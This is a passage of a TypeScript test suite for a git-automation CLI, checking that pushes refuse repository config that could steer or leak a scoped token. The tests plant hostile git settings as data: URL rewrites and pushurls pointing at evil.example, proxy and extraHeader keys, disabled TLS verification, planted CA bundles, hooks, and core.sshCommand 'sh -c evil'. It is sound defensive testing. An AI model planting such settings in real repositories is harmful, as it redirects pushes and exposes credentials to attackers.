		assert.throws(() => prepareWorkRepo(git, { gitDir: state, workTree: old }, bare, frozen, process.env),
			(error: CliError) => error.code === "DIR_NOT_WORK_REPO" && error.message.includes("fresh --dir"));
	} finally { rmSync(root, { recursive: true, force: true }); }
});

test("a state git directory whose checkout is gone adopts a fresh empty --dir and refuses a live one", () => {
	const root = mkdtempSync(join(tmpdir(), "acquit-run-adopt-"));
	try {
		const { bare, frozen, git } = workRepoFixture(root);
		const state = stateGitDir("job_7Q2K", { XDG_STATE_HOME: join(root, "state-home") });
		const first = join(root, "first");
		// The CLI's own hardened env: the adopted checkout's rerun fetch carries the scoped token.
		const env = hardenedEnv(root);
		prepareWorkRepo(git, { gitDir: state, workTree: first }, bare, frozen, env);
		// While the recorded checkout lives, a different non-empty checkout is refused.
		const other = join(root, "other");
		mkdirSync(other);
		writeFileSync(join(other, "notes.txt"), "operator files\n");
		assert.throws(() => prepareWorkRepo(git, { gitDir: state, workTree: other }, bare, frozen, process.env),
			(error: CliError) => error.code === "DIR_NOT_WORK_REPO");
		// Once it is gone, an empty (or missing) --dir is adopted and the marker follows it.
		rmSync(first, { recursive: true, force: true });
		const fresh = join(root, "fresh");
		prepareWorkRepo(git, { gitDir: state, workTree: fresh }, bare, frozen, env);
		assert.equal(recordedWorkTree(state), fresh);
		assert.equal(git(["--git-dir", state, "--work-tree", fresh, "rev-parse", "HEAD"]).stdout.trim(), frozen);
	} finally { rmSync(root, { recursive: true, force: true }); }
});

test("a state git directory with no recorded work tree is refused by name", () => {
	const root = mkdtempSync(join(tmpdir(), "acquit-run-marker-"));
	try {
		const { bare, frozen, git } = workRepoFixture(root);
		const state = stateGitDir("job_7Q2K", { XDG_STATE_HOME: join(root, "state-home") });
		mkdirSync(state, { recursive: true });
		assert.throws(() => prepareWorkRepo(git, { gitDir: state, workTree: join(root, "work") }, bare, frozen, process.env),
			(error: CliError) => error.code === "DIR_NOT_WORK_REPO" && error.message.includes("no recorded work tree"));
	} finally { rmSync(root, { recursive: true, force: true }); }
});

test("a --dir that is a regular file is refused as DIR_NOT_WORK_REPO, never as an ENOTDIR stack", () => {
	const root = mkdtempSync(join(tmpdir(), "acquit-run-file-dir-"));
	try {
		const { bare, frozen, git } = workRepoFixture(root);
		const state = stateGitDir("job_7Q2K", { XDG_STATE_HOME: join(root, "state-home") });
		const file = join(root, "notes.txt");
		writeFileSync(file, "not a checkout\n");
		assert.throws(() => prepareWorkRepo(git, { gitDir: state, workTree: file }, bare, frozen, process.env),
			(error: CliError) => error.code === "DIR_NOT_WORK_REPO" && error.message.includes("not a directory"));
	} finally { rmSync(root, { recursive: true, force: true }); }
});

test("the operator's global git identity is copied into the state git directory, not read from it", () => {
	const root = mkdtempSync(join(tmpdir(), "acquit-run-identity-"));
	try {
		const { bare, frozen, git } = workRepoFixture(root);
		const home = join(root, "home");
		mkdirSync(home);
		writeFileSync(join(home, ".gitconfig"), "[user]\n\tname = Devon Ops\n\temail = devon@example.invalid\n");
		const state = stateGitDir("job_7Q2K", { XDG_STATE_HOME: join(root, "state-home") });
		const work = join(root, "work");
		const checkout = { gitDir: state, workTree: work };
		const operatorEnv = { PATH: process.env.PATH, HOME: home, XDG_STATE_HOME: join(root, "state-home") };
		const gitEnv = hardenedGitEnv(operatorEnv);
		// The hardened env alone can see no global identity; the operator's own env is read first.
		assert.equal(globalGitIdentity(git, operatorEnv).email, "devon@example.invalid");
		prepareWorkRepo(git, checkout, bare, frozen, gitEnv);
		seedCommitIdentity(git, checkout, globalGitIdentity(git, operatorEnv), gitEnv);
		writeFileSync(join(work, "money.ts"), "const DECIMALS = 3;\n");
		const commit = submissionCommit(git, checkout, frozen, "fix", gitEnv);
		assert.notEqual(commit, null);
		const author = git(["--git-dir", state, "log", "-1", "--format=%an <%ae>"]).stdout.trim();
		assert.equal(author, "Devon Ops <devon@example.invalid>");
	} finally { rmSync(root, { recursive: true, force: true }); }
});

test("a push refuses state config the CLI did not write, and never runs a hook it finds", () => {
	const root = mkdtempSync(join(tmpdir(), "acquit-run-config-"));
	try {
		const { bare, frozen, git } = workRepoFixture(root);
		const env = hardenedEnv(root);
		const state = stateGitDir("job_7Q2K", env);
		const work = join(root, "work");
		const checkout = { gitDir: state, workTree: work };
		prepareWorkRepo(git, checkout, bare, frozen, env);
		writeFileSync(join(work, "money.ts"), "const DECIMALS = 3;\n");
		const commit = submissionCommit(git, checkout, frozen, "fix", env);
		assert.notEqual(commit, null);
		// A hook in the state gitdir never runs: core.hooksPath points at the CLI's empty directory.
		const canary = join(root, "hook-ran");
		mkdirSync(join(state, "hooks"), { recursive: true });
		writeFileSync(join(state, "hooks", "pre-push"), `#!/bin/sh\ntouch ${canary}\n`, { mode: 0o755 });
		pushWork(git, checkout, bare, commit!, env);
		assert.equal(existsSync(canary), false);
		assert.equal(spawnSync("git", ["--git-dir", bare, "rev-parse", `refs/heads/submissions/${commit}`]).status, 0);
		// A URL rewrite the CLI did not write refuses the push before git can read it. The refusal
		// names the state git directory and the remedy that belongs to it.
		assert.equal(git(["--git-dir", state, "config", "--local", "url.https://evil.example/.insteadOf", bare]).status, 0);
		assert.throws(() => pushWork(git, checkout, bare, commit!, env),
			(error: CliError) => error.code === "GIT_CONFIG_UNSAFE" && error.message.includes("url.https://evil.example/.insteadof")
				&& error.message.includes(state) && error.message.includes("fresh --dir"));
	} finally { rmSync(root, { recursive: true, force: true }); }
});

test("the unsafe-config refusal names an operator's own git directory and its --unset remedy", () => {
	const root = mkdtempSync(join(tmpdir(), "acquit-run-ownconfig-"));
	try {
		const { bare, git } = workRepoFixture(root);
		const env = hardenedEnv(root);
		const own = join(root, "own");
		assert.equal(spawnSync("git", ["clone", "--quiet", bare, own], { encoding: "utf8" }).status, 0);
		const gitDir = join(own, ".git");
		assert.equal(git(["-C", own, "config", "--local", "url.https://evil.example/.insteadOf", bare]).status, 0);
		assert.throws(() => assertSafeScopedConfig(git, { gitDir, workTree: own }, env, "own", bare),
			(error: CliError) => error.code === "GIT_CONFIG_UNSAFE" && error.message.includes(gitDir)
				&& error.message.includes("git config --local --unset") && error.message.includes("url.https://evil.example/.insteadof"));
	} finally { rmSync(root, { recursive: true, force: true }); }
});

test("a planted pushInsteadOf is refused, and the decoy it names never receives the push", () => {
	const root = mkdtempSync(join(tmpdir(), "acquit-run-pushinstead-"));
	try {
		const { bare, frozen, git } = workRepoFixture(root);
		const env = hardenedEnv(root);
		const state = stateGitDir("job_7Q2K", env);
		const work = join(root, "work");
		const checkout = { gitDir: state, workTree: work };
		prepareWorkRepo(git, checkout, bare, frozen, env);
		writeFileSync(join(work, "money.ts"), "const DECIMALS = 3;\n");
		const commit = submissionCommit(git, checkout, frozen, "fix", env);
		assert.notEqual(commit, null);
		// A real rewrite to a real decoy: pushing to the bare path would land in the decoy instead.
		const decoy = join(root, "decoy.git");
		assert.equal(spawnSync("git", ["init", "--bare", "--quiet", decoy]).status, 0);
		assert.equal(git(["--git-dir", state, "config", "--local", `url.${decoy}.pushInsteadOf`, bare]).status, 0);
		assert.throws(() => pushWork(git, checkout, bare, commit!, env),
			(error: CliError) => error.code === "GIT_CONFIG_UNSAFE" && error.message.includes("pushinsteadof"));
		assert.equal(spawnSync("git", ["--git-dir", decoy, "for-each-ref"], { encoding: "utf8" }).stdout.trim(), "");
	} finally { rmSync(root, { recursive: true, force: true }); }
});

test("a state gitdir's origin is exactly the one URL the CLI cloned, and a remote the CLI did not write refuses", () => {
	const root = mkdtempSync(join(tmpdir(), "acquit-run-remote-url-"));
	try {
		const { bare, frozen, git } = workRepoFixture(root);
		const env = hardenedEnv(root);
		const state = stateGitDir("job_7Q2K", env);
		const work = join(root, "work");
		const checkout = { gitDir: state, workTree: work };
		prepareWorkRepo(git, checkout, bare, frozen, env);
		writeFileSync(join(work, "money.ts"), "const DECIMALS = 3;\n");
		const commit = submissionCommit(git, checkout, frozen, "fix", env);
		assert.notEqual(commit, null);
		const origin = (...values: readonly string[]): void => {
			assert.equal(git(["--git-dir", state, "config", "--local", "--unset-all", "remote.origin.url"]).status, 0);
			for (const value of values) assert.equal(git(["--git-dir", state, "config", "--local", "--add", "remote.origin.url", value]).status, 0, value);
		};
		// The clone's own origin is the one URL this checkout was cloned from.
		assert.deepEqual(unsafeGitConfigKeys(git, checkout, env, "state", bare), []);
		// A github.com URL is not this checkout's origin: only the exact URL passes, and the token
		// call names that URL, so a lookalike or a different host cannot steer it.
		origin("https://github.com/acquit-forks/invoice-app-7q2k.git");
		assert.deepEqual(unsafeGitConfigKeys(git, checkout, env, "state", bare), ["remote.origin.url"]);
		assert.throws(() => pushWork(git, checkout, bare, commit!, env),
			(error: CliError) => error.code === "GIT_CONFIG_UNSAFE" && error.message.includes("remote.origin.url"));
		// The same URL in another spelling passes: the comparison trims a trailing slash and `.git`.
		origin(`${bare}/`);
		assert.deepEqual(unsafeGitConfigKeys(git, checkout, env, "state", bare), []);
		// A second value refuses even when the first one is the real URL, and even when both are.
		origin(bare, "https://evil.example/repo.git");
		assert.deepEqual(unsafeGitConfigKeys(git, checkout, env, "state", bare), ["remote.origin.url"]);
		origin(bare, bare);
		assert.deepEqual(unsafeGitConfigKeys(git, checkout, env, "state", bare), ["remote.origin.url"]);
		// Any other host refuses, scp-like values with no userinfo prefix included.
		origin("evil.example:repo");
		assert.deepEqual(unsafeGitConfigKeys(git, checkout, env, "state", bare), ["remote.origin.url"]);
		origin("evil.example:repo.git");
		assert.deepEqual(unsafeGitConfigKeys(git, checkout, env, "state", bare), ["remote.origin.url"]);
		// A second remote is config the CLI did not write: a state checkout keeps remote.origin.url
		// alone, so `remote.work.url` refuses even when it names github.com.
		origin(bare);
		assert.equal(git(["--git-dir", state, "config", "--local", "remote.work.url", "https://github.com/acquit-forks/invoice-app-7q2k.git"]).status, 0);
		assert.deepEqual(unsafeGitConfigKeys(git, checkout, env, "state", bare), ["remote.work.url"]);
	} finally { rmSync(root, { recursive: true, force: true }); }
});

test("an operator's own checkout's remotes are theirs; a rewrite still refuses it", () => {
	const root = mkdtempSync(join(tmpdir(), "acquit-run-own-remote-"));
	try {
		const { bare, git } = workRepoFixture(root);
		const env = hardenedEnv(root);
		const own = join(root, "own");
		assert.equal(spawnSync("git", ["clone", "--quiet", bare, own], { encoding: "utf8" }).status, 0);
		const location = { gitDir: join(own, ".git"), workTree: own };
		// The scoped push names the work-repo URL explicitly, so a remote in the operator's own
		// checkout cannot steer it: their remotes are theirs.
		assert.equal(git(["-C", own, "config", "--local", "remote.evil.url", "https://evil.example/invoice-app-7q2k.git"]).status, 0);
		assert.deepEqual(unsafeGitConfigKeys(git, location, env, "own", bare), []);
		assert.doesNotThrow(() => assertSafeScopedConfig(git, location, env, "own", bare));
		// Every rewrite stays refused everywhere, the own checkout included: those rewrite the URL
		// the scoped push names, not the checkout's own.
		assert.equal(git(["-C", own, "config", "--local", `url.https://evil.example/.insteadOf`, bare]).status, 0);
		assert.deepEqual(unsafeGitConfigKeys(git, location, env, "own", bare), ["url.https://evil.example/.insteadof"]);
		assert.throws(() => assertSafeScopedConfig(git, location, env, "own", bare),
			(error: CliError) => error.code === "GIT_CONFIG_UNSAFE" && error.message.includes("git config --local --unset"));
	} finally { rmSync(root, { recursive: true, force: true }); }
});

test("URL-scoped and plain http config keys refuse a scoped push on a state checkout", () => {
	const root = mkdtempSync(join(tmpdir(), "acquit-run-http-config-"));
	try {
		const { bare, frozen, git } = workRepoFixture(root);
		const env = hardenedEnv(root);
		const state = stateGitDir("job_7Q2K", env);
		const work = join(root, "work");
		const checkout = { gitDir: state, workTree: work };
		prepareWorkRepo(git, checkout, bare, frozen, env);
		const config = (key: string, value: string): void => {
			assert.equal(git(["--git-dir", state, "config", "--local", key, value]).status, 0, key);
		};
		// A plain key loses to the guard's own -c override, but a URL-scoped key does not: git tries
		// the longest URL match first, so both shapes must refuse before a token meets git.
		const unsafe: readonly (readonly [string, string])[] = [
			["http.proxy", "http://evil.example:8080"],
			["http.https://evil.example/.proxy", "http://evil.example:8080"],
			["http.sslVerify", "false"],
			["http.https://evil.example/.sslVerify", "false"],
			["http.extraHeader", "Authorization: Bearer evil"],
			["http.https://evil.example/.extraHeader", "Authorization: Bearer evil"],
		];
		for (const [key, value] of unsafe) {
			config(key, value);
			assert.deepEqual(unsafeGitConfigKeys(git, checkout, env, "state", bare), [key.toLowerCase()], key);
			assert.throws(() => pushWork(git, checkout, bare, "a".repeat(40) as CommitSha, env),
				(error: CliError) => error.code === "GIT_CONFIG_UNSAFE" && error.message.includes(key.toLowerCase()), key);
			assert.equal(git(["--git-dir", state, "config", "--local", "--unset", key]).status, 0, key);
		}
		// The state policy keeps only the keys the CLI's own clone writes, and it writes no http key:
		// verification is settled by the guard's `-c` overrides. So a true sslVerify is config the CLI
		// did not write here and refuses with the rest.
		config("http.sslVerify", "true");
		assert.deepEqual(unsafeGitConfigKeys(git, checkout, env, "state", bare), ["http.sslverify"]);
	} finally { rmSync(root, { recursive: true, force: true }); }
});

test("git decides which sslVerify spellings are false, so empty, 00, 0x0, and 0k refuse like false", () => {
	const root = mkdtempSync(join(tmpdir(), "acquit-run-sslverify-"));
	try {
		const { bare, frozen, git } = workRepoFixture(root);
		const env = hardenedEnv(root);
		// This value judgement is the own-checkout policy's: an operator's checkout may hold an http
		// key, and the question is only whether git would read it as true.
		const own = join(root, "own");
		assert.equal(spawnSync("git", ["clone", "--quiet", bare, own], { encoding: "utf8" }).status, 0);
		const location = { gitDir: join(own, ".git"), workTree: own };
		const config = (key: string, value: string): void => {
			assert.equal(git(["-C", own, "config", "--local", key, value]).status, 0, key);
		};
		const unset = (key: string): void => {
			assert.equal(git(["-C", own, "config", "--local", "--unset-all", key]).status, 0, key);
		};
		// git reads each of these as boolean false, and the guard's own -c http.sslVerify=true loses
		// to a URL-scoped key. A hand-written list of false spellings caught only the last one.
		for (const value of ["", "00", "0x0", "0k", "false"]) {
			config("http.sslVerify", value);
			assert.deepEqual(unsafeGitConfigKeys(git, location, env, "own", bare), ["http.sslverify"], JSON.stringify(value));
			assert.throws(() => assertSafeScopedConfig(git, location, env, "own", bare),
				(error: CliError) => error.code === "GIT_CONFIG_UNSAFE" && error.message.includes("http.sslverify"), JSON.stringify(value));
			unset("http.sslVerify");
		}
		// The URL-scoped empty value is the same false, and no guard override outranks it.
		config("http.https://evil.example/.sslVerify", "");
		assert.deepEqual(unsafeGitConfigKeys(git, location, env, "own", bare), ["http.https://evil.example/.sslverify"]);
		assert.throws(() => assertSafeScopedConfig(git, location, env, "own", bare),
			(error: CliError) => error.code === "GIT_CONFIG_UNSAFE" && error.message.includes("http.https://evil.example/.sslverify"));
		unset("http.https://evil.example/.sslVerify");
		// Every spelling git reads as true passes, and a key present with no value is true to git.
		for (const value of ["true", "yes", "on", "1"]) {
			config("http.sslVerify", value);
			assert.deepEqual(unsafeGitConfigKeys(git, location, env, "own", bare), [], value);
			unset("http.sslVerify");
		}
		writeFileSync(join(own, ".git", "config"), `${readFileSync(join(own, ".git", "config"), "utf8")}\n[http]\n\tsslVerify\n`);
		assert.deepEqual(unsafeGitConfigKeys(git, location, env, "own", bare), []);
		// git cannot read this one as a boolean at all, and an answer that is not true refuses.
		config("http.sslVerify", "banana");
		assert.deepEqual(unsafeGitConfigKeys(git, location, env, "own", bare), ["http.sslverify"]);
		// A state checkout never gets to that judgement: the CLI writes no http key into its own
		// clone, so the key refuses there whatever value it holds.
		const state = stateGitDir("job_7Q2K", env);
		const checkout = { gitDir: state, workTree: join(root, "work") };
		prepareWorkRepo(git, checkout, bare, frozen, env);
		for (const value of ["true", "false", ""]) {
			assert.equal(git(["--git-dir", state, "config", "--local", "http.sslVerify", value]).status, 0, JSON.stringify(value));
			assert.deepEqual(unsafeGitConfigKeys(git, checkout, env, "state", bare), ["http.sslverify"], JSON.stringify(value));
			assert.equal(git(["--git-dir", state, "config", "--local", "--unset-all", "http.sslVerify"]).status, 0);
		}
	} finally { rmSync(root, { recursive: true, force: true }); }
});

test("a planted sslCAInfo or sslCAPath refuses plain and URL-scoped", () => {
	const root = mkdtempSync(join(tmpdir(), "acquit-run-sslca-"));
	try {
		const { bare, frozen, git } = workRepoFixture(root);
		const env = hardenedEnv(root);
		const state = stateGitDir("job_7Q2K", env);
		const checkout = { gitDir: state, workTree: join(root, "work") };
		prepareWorkRepo(git, checkout, bare, frozen, env);
		// A planted CA bundle lets a forged certificate pass verification on the scoped push: the same
		// precondition and outcome as sslVerify=false, so both names refuse in both shapes.
		for (const key of ["http.sslCAInfo", "http.https://evil.example/.sslCAInfo", "http.sslCAPath", "http.https://evil.example/.sslCAPath"]) {
			assert.equal(git(["--git-dir", state, "config", "--local", key, "/tmp/planted-ca"]).status, 0, key);
			assert.deepEqual(unsafeGitConfigKeys(git, checkout, env, "state", bare), [key.toLowerCase()], key);
			assert.throws(() => pushWork(git, checkout, bare, "a".repeat(40) as CommitSha, env),
				(error: CliError) => error.code === "GIT_CONFIG_UNSAFE" && error.message.includes(key.toLowerCase()), key);
			assert.equal(git(["--git-dir", state, "config", "--local", "--unset-all", key]).status, 0, key);
		}
		// A config-file spelling git normalizes on read refuses the same way.
		writeFileSync(join(state, "config"), `${readFileSync(join(state, "config"), "utf8")}\n[HTTP]\n\tSSLCaInfo = /tmp/planted-ca\n`);
		assert.deepEqual(unsafeGitConfigKeys(git, checkout, env, "state", bare), ["http.sslcainfo"]);
	} finally { rmSync(root, { recursive: true, force: true }); }
});

test("a fresh state checkout the CLI cloned and seeded holds no key the state policy refuses", () => {
	const root = mkdtempSync(join(tmpdir(), "acquit-run-state-allow-"));
	try {
		const { bare, frozen, git } = workRepoFixture(root);
		const env = hardenedEnv(root);
		const state = stateGitDir("job_7Q2K", env);
		const checkout = { gitDir: state, workTree: join(root, "work") };
		prepareWorkRepo(git, checkout, bare, frozen, env);
		seedCommitIdentity(git, checkout, { name: "operator", email: "operator@example.invalid" }, env);
		// An allowlist is only correct while it covers every key the CLI's own clone writes, and the
		// audit's finding was one key it did not name. This reads the real list, so a git that writes
		// one more key fails here by name instead of refusing every run. The fixture's bare repo HEAD
		// names a branch its own push never created, so this clone writes no branch section; the
		// state policy keeps branch.* for the clone whose remote does name its default branch.
		const listed = git(["--git-dir", state, "config", "--local", "--list", "--name-only"]).stdout.trim().split("\n").filter(line => line !== "");
		assert.ok(listed.includes("core.repositoryformatversion"), listed.join(", "));
		assert.ok(listed.includes("remote.origin.url"), listed.join(", "));
		assert.ok(listed.includes("remote.origin.fetch"), listed.join(", "));
		assert.ok(listed.includes("user.name") && listed.includes("user.email"), listed.join(", "));
		assert.deepEqual(unsafeGitConfigKeys(git, checkout, env, "state", bare), [], `the clone wrote ${listed.join(", ")}`);
		assert.doesNotThrow(() => assertSafeScopedConfig(git, checkout, env, "state", bare));
		// A rerun reads the same checkout again and fetches through the scoped token, so the rerun
		// branch scans the location it is about to fetch from: this proves the allowlist matches the
		// checkout the CLI itself produced, not only the one it had just cloned.
		const secret = makeSecretDir();
		try {
			const askpass = writeAskpass(secret.path, "ghs_CANARY_STATE_ALLOW");
			assert.doesNotThrow(() => prepareWorkRepo(git, checkout, bare, frozen, env, askpass.env));
			// The scoped push names the same URL the clone wrote, so the exact-origin rule keeps a
			// checkout the CLI itself produced and the token call runs.
			writeFileSync(join(checkout.workTree, "money.ts"), "const DECIMALS = 3;\n");
			const commit = submissionCommit(git, checkout, frozen, "fix", env);
			assert.notEqual(commit, null);
			assert.doesNotThrow(() => pushWork(git, checkout, bare, commit!, env, askpass.env));
			assert.equal(git(["--git-dir", bare, "rev-parse", `refs/heads/submissions/${commit}`]).status, 0);
		} finally { secret.remove(); }
	} finally { rmSync(root, { recursive: true, force: true }); }
});

test("a state checkout keeps only the clone's own keys, so any other key refuses by name", () => {
	const root = mkdtempSync(join(tmpdir(), "acquit-run-state-unlisted-"));
	try {
		const { bare, frozen, git } = workRepoFixture(root);
		const env = hardenedEnv(root);
		const state = stateGitDir("job_7Q2K", env);
		const checkout = { gitDir: state, workTree: join(root, "work") };
		prepareWorkRepo(git, checkout, bare, frozen, env);
		seedCommitIdentity(git, checkout, { name: "operator", email: "operator@example.invalid" }, env);
		// Every one of these is a key the CLI's clone never writes, so the state policy refuses each by
		// name. The first two are the leak the audit found: git answers a proxy's 407 with its
		// credential source, so a proxy key in the state config hands the scoped token to whoever
		// answers the CONNECT, and no key-by-key value rule could be trusted to see that.
		for (const key of ["remote.origin.proxy", "remote.origin.proxyAuthMethod", "remote.origin.pushurl",
			"remote.origin.vcs", "core.fsmonitor", "gc.auto", "foo.bar", "include.path"]) {
			assert.equal(git(["--git-dir", state, "config", "--local", key, "http://127.0.0.1:1/"]).status, 0, key);
			assert.deepEqual(unsafeGitConfigKeys(git, checkout, env, "state", bare), [key.toLowerCase()], key);
			assert.throws(() => assertSafeScopedConfig(git, checkout, env, "state", bare),
				(error: CliError) => error.code === "GIT_CONFIG_UNSAFE" && error.message.includes(key.toLowerCase()), key);
			assert.equal(git(["--git-dir", state, "config", "--local", "--unset-all", key]).status, 0, key);
		}
		// A second remote is unlisted whatever it names, even when its URL names github.com: only the
		// remote the clone wrote has a value rule that knows which URLs the job's work repo can be at.
		assert.equal(git(["--git-dir", state, "config", "--local", "remote.work.pushurl", "https://evil.example/repo.git"]).status, 0);
		assert.deepEqual(unsafeGitConfigKeys(git, checkout, env, "state", bare), ["remote.work.pushurl"]);
		assert.equal(git(["--git-dir", state, "config", "--local", "--unset-all", "remote.work.pushurl"]).status, 0);
		// The clone's own origin keeps a value rule: the refspec the rerun fetch reads is the one the
		// clone wrote, so any other refspec refuses.
		assert.equal(git(["--git-dir", state, "config", "--local", "remote.origin.fetch", "+refs/heads/*:refs/heads/*"]).status, 0);
		assert.deepEqual(unsafeGitConfigKeys(git, checkout, env, "state", bare), ["remote.origin.fetch"]);
	} finally { rmSync(root, { recursive: true, force: true }); }
});

test("an operator's own checkout keeps the keys that do not steer the scoped token", () => {
	const root = mkdtempSync(join(tmpdir(), "acquit-run-own-keep-"));
	try {
		const { bare, git } = workRepoFixture(root);
		const env = hardenedEnv(root);
		const own = join(root, "own");
		assert.equal(spawnSync("git", ["clone", "--quiet", bare, own], { encoding: "utf8" }).status, 0);
		const location = { gitDir: join(own, ".git"), workTree: own };
		const config = (key: string, value: string): void => {
			assert.equal(git(["-C", own, "config", "--local", key, value]).status, 0, key);
		};
		const unset = (key: string): void => {
			assert.equal(git(["-C", own, "config", "--local", "--unset-all", key]).status, 0, key);
		};
		// The operator's own checkout: their identity, their editor, their colour, their push default,
		// and the remote their own clone wrote are all theirs to keep.
		config("user.name", "operator");
		config("user.email", "operator@example.invalid");
		config("core.editor", "vim");
		config("color.ui", "auto");
		config("push.default", "simple");
		assert.deepEqual(unsafeGitConfigKeys(git, location, env, "own", bare), []);
		assert.doesNotThrow(() => assertSafeScopedConfig(git, location, env, "own", bare));
		// Each of these can move the scoped token, add a header to its request, turn off the
		// verification of where it goes, or run code on the machine that holds it. A remote nickname
		// cannot hold a slash, so a URL-named remote's own `.url` refuses too.
		for (const [key, value] of [["remote.origin.proxy", "http://127.0.0.1:1"],
			["remote.origin.proxyAuthMethod", "basic"], ["remote.origin.pushurl", "https://evil.example/repo.git"],
			["http.proxy", "http://127.0.0.1:1"], ["http.https://evil.example/.proxy", "http://127.0.0.1:1"],
			["http.extraHeader", "Authorization: Basic eA=="], ["http.https://evil.example/.extraHeader", "Authorization: Basic eA=="],
			["http.sslCAInfo", "/tmp/planted-ca"], ["http.https://evil.example/.sslCAInfo", "/tmp/planted-ca"],
			["core.hooksPath", "/tmp/planted-hooks"], ["core.sshCommand", "sh -c evil"], ["core.fsmonitor", "/tmp/planted-fsmonitor"],
			["credential.helper", "/tmp/planted-helper"], ["include.path", "/tmp/planted-include"],
			["url.https://evil.example/.insteadOf", "https://github.com/"],
			["url.https://evil.example/.pushInsteadOf", "https://github.com/"],
			["remote.https://evil.example/repo.git.url", "https://evil.example/repo.git"]] as const) {
			config(key, value);
			assert.deepEqual(unsafeGitConfigKeys(git, location, env, "own", bare), [key.toLowerCase()], key);
			assert.throws(() => assertSafeScopedConfig(git, location, env, "own", bare),
				(error: CliError) => error.code === "GIT_CONFIG_UNSAFE" && error.message.includes(key.toLowerCase()), key);
			unset(key);
		}
		// A refusal is per key, never a verdict on the checkout: the kept keys are still there.
		assert.deepEqual(unsafeGitConfigKeys(git, location, env, "own", bare), []);
	} finally { rmSync(root, { recursive: true, force: true }); }
});

/** The port a test server child prints as its first stdout line, or a rejection when it dies first. */
async function printedPort(child: ChildProcess): Promise<number> {
	return await new Promise<number>((resolve, reject) => {
		let output = "";
		child.stdout?.on("data", (chunk: Buffer) => {
			output += chunk.toString("utf8");
			const first = output.split("\n")[0] ?? "";
			if (/^\d+$/.test(first)) resolve(Number(first));
		});
		child.once("error", reject);
		child.once("exit", code => reject(new Error(`the test remote exited ${code}`)));
	});
}

/**
 * A self-signed HTTPS server in its own process that records every request's Authorization header and
 * answers 401, so the push that dials it asks the CLI's askpass. pushWork and pushHead are
 * synchronous, so an in-process server could never answer the git child they block on. `scope` is the
 * URL subsection a planted key names; `cert` is the certificate a planted CA key would trust.
 */
async function selfSignedRemote(root: string): Promise<{ readonly url: string; readonly scope: string; readonly cert: string;
	readonly requests: () => readonly { readonly authorization: string }[]; readonly stop: () => void }> {
	const key = join(root, "key.pem");
	const cert = join(root, "cert.pem");
	const openssl = spawnSync("openssl", ["req", "-x509", "-newkey", "rsa:2048", "-nodes", "-keyout", key, "-out", cert,
		"-days", "1", "-subj", "/CN=127.0.0.1", "-addext", "subjectAltName=IP:127.0.0.1"], { encoding: "utf8" });
	assert.equal(openssl.status, 0, `openssl could not make the test certificate: ${openssl.stderr}`);
	const log = join(root, "requests.log");
	writeFileSync(log, "");
	const child = spawn(process.execPath, ["--input-type=module", "-e",
		"import { appendFileSync, readFileSync } from 'node:fs';\n"
		+ "import { createServer } from 'node:https';\n"
		+ `const server = createServer({ key: readFileSync(${JSON.stringify(key)}), cert: readFileSync(${JSON.stringify(cert)}) }, (request, response) => {\n`
		+ `	appendFileSync(${JSON.stringify(log)}, JSON.stringify({ url: request.url ?? "", authorization: request.headers.authorization ?? "" }) + "\\n");\n`
		+ "	response.writeHead(401, { 'WWW-Authenticate': 'Basic realm=\"acquit-test\"' });\n"
		+ "	response.end('no\\n');\n"
		+ "});\n"
		+ "server.listen(0, '127.0.0.1', () => console.log(server.address().port));\n"],
		{ stdio: ["ignore", "pipe", "pipe"] });
	const port = await printedPort(child);
	return {
		url: `https://127.0.0.1:${port}/invoice-app-7q2k.git`,
		scope: `https://127.0.0.1:${port}/`,
		cert,
		requests: () => readFileSync(log, "utf8").split("\n").filter(line => line !== "")
			.map(line => JSON.parse(line) as { readonly authorization: string }),
		stop: () => child.kill("SIGKILL"),
	};
}

/** Whether a recorded request carried the canary in its basic auth, so a "no request" assertion is
 * measured against a token that really does arrive when a push dials the server. */
function carriedCanary(records: readonly { readonly authorization: string }[], canary: string): boolean {
	return records.some(record => {
		const encoded = record.authorization.replace(/^Basic\s+/i, "");
		return encoded !== "" && Buffer.from(encoded, "base64").toString("utf8").includes(canary);
	});
}

/**
 * A plain-HTTP remote in its own process that records every request and answers 401, so a git child
 * that dials it asks the CLI's askpass. A fetch is synchronous, so an in-process server could never
 * answer it. The host is the lookalike form's target too: `http://github.com\@127.0.0.1:<port>/...`
 * reads as github.com to WHATWG's URL parser and as 127.0.0.1 to git and curl.
 */
async function recordingHttpRemote(root: string): Promise<{ readonly port: number; readonly url: string; readonly agentUrl: string;
	readonly requests: () => readonly { readonly url: string; readonly authorization: string }[]; readonly stop: () => void }> {
	const log = join(root, "requests.log");
	writeFileSync(log, "");
	const child = spawn(process.execPath, ["--input-type=module", "-e",
		"import { appendFileSync } from 'node:fs';\n"
		+ "import { createServer } from 'node:http';\n"
		+ "const server = createServer((request, response) => {\n"
		+ `	appendFileSync(${JSON.stringify(log)}, JSON.stringify({ url: request.url ?? "", authorization: request.headers.authorization ?? "" }) + "\\n");\n`
		+ "	response.writeHead(401, { 'WWW-Authenticate': 'Basic realm=\"acquit-test\"' });\n"
		+ "	response.end();\n"
		+ "});\n"
		+ "server.listen(0, '127.0.0.1', () => console.log(server.address().port));\n"],
		{ stdio: ["ignore", "pipe", "pipe"] });
	const port = await printedPort(child);
	return {
		port,
		url: `http://127.0.0.1:${port}/invoice-app-7q2k.git`,
		agentUrl: `http://127.0.0.1:${port}/agent.git`,
		requests: () => readFileSync(log, "utf8").split("\n").filter(line => line !== "")
			.map(line => JSON.parse(line) as { readonly url: string; readonly authorization: string }),
		stop: () => child.kill("SIGKILL"),
	};
}

test("worktree config the push reads refuses through pushWork and pushHead, and no request leaves", async () => {
	const root = mkdtempSync(join(tmpdir(), "acquit-run-worktree-config-"));
	const remote = await selfSignedRemote(root);
	const secret = makeSecretDir();
	try {
		const { bare, frozen, git } = workRepoFixture(root);
		const env = hardenedEnv(root);
		const state = stateGitDir("job_7Q2K", env);
		const checkout = { gitDir: state, workTree: join(root, "work") };
		prepareWorkRepo(git, checkout, bare, frozen, env);
		// The scoped push this test guards names the self-signed remote, so the checkout's origin is
		// that URL: the state scan judges the origin against the exact URL the token call names.
		assert.equal(git(["--git-dir", state, "config", "--local", "remote.origin.url", remote.url]).status, 0);
		writeFileSync(join(checkout.workTree, "money.ts"), "const DECIMALS = 3;\n");
		const commit = submissionCommit(git, checkout, frozen, "fix", env);
		assert.notEqual(commit, null);
		const canary = "ghs_CANARY_WORKTREE_CONFIG";
		const askpass = writeAskpass(secret.path, canary);
		const pushEnv = { ...env, ...askpass.env };
		const pristine = readFileSync(join(state, "config"), "utf8");
		const includeFile = join(root, "included-worktree.conf");
